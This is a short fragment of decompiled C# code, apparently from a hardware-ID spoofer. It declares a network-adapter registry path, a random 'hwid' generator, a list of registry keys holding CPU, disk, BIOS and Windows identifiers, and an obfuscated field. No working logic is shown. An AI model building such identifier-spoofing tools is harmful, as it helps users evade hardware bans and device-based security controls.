		private string RegPath = "Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\";

		// Token: 0x04000015 RID: 21
		private string Device;

		// Token: 0x04000016 RID: 22
		private string DriverDesc;

		// Token: 0x04000017 RID: 23
		private static Random rndhwid = new Random();

		// Token: 0x04000018 RID: 24
		private string[] regkeyshwid = new string[]
		{
			"HARDWARE\\Description\\System\\CentralProcessor\\0",
			"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
			"SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
			"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
			"HARDWARE\\DESCRIPTION\\System\\BIOS"
		};

		// Token: 0x04000019 RID: 25
		private string[,] ValuesKeysHWID;

		// Token: 0x0400001A RID: 26
		public static string[,] sOPIC9JSa8Gu;

		// Token: 0x0400001B RID: 27
		public static string IDgenerate;

		// Token: 0x0400001C RID: 28
		private List<Process> processlist;
	}
}
